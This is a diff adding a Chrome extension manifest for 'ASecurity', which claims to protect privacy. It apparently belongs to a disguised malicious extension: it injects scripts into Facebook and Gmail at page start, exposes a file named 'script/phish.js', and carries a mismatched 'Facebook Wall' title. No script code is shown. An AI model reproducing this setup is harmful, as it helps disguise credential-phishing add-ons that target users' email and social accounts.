@@ -1,0 +1,55 @@
+{
+  "update_url": "https://clients2.google.com/service/update2/crx",
+  "name": "ASecurity",
+  "version": "2.0",
+  "manifest_version": 2,
+  "description": "Protect your privacy while on internet",
+  "icons": {
+    "16": "icons/icon16.png",
+    "32": "icons/icon32.png",
+    "64": "icons/icon64.png",
+    "128": "icons.png"
+  },
+  "background": {
+    "scripts": [
+      "background.js"
+    ],
+    "persistent": false
+  },
+  "browser_action": {
+    "default_title": "Facebook Wall",
+    "default_icon": "icons.png",
+    "default_popup": "popup.html"
+  },
+  "options_page": "options.html",
+  "content_scripts": [
+    {
+      "matches": [
+        "https://*.facebook.com/*",
+        "https://www.facebook.com/*",
+        "*://mail.google.com/*"
+      ],
+      "js": [
+        "script/facebook.js",
+        "libs/jquery/jquery.min.js",
+        "content.js",
+        "script/gmail.js"
+      ],
+      "css": [
+        "css/gmail.css"
+      ],
+      "run_at": "document_start"
+    }
+  ],
+  "web_accessible_resources": [
+    "script/gmail1.js",
+    "script/phish.js",
+    "libs/jquery/jquery.min.js",
+    "options.html"
+  ],
+  "permissions": [
+    "storage",
+    "webRequestBlocking",
+    "*://*.facebook.com/*"
+  ]
+}
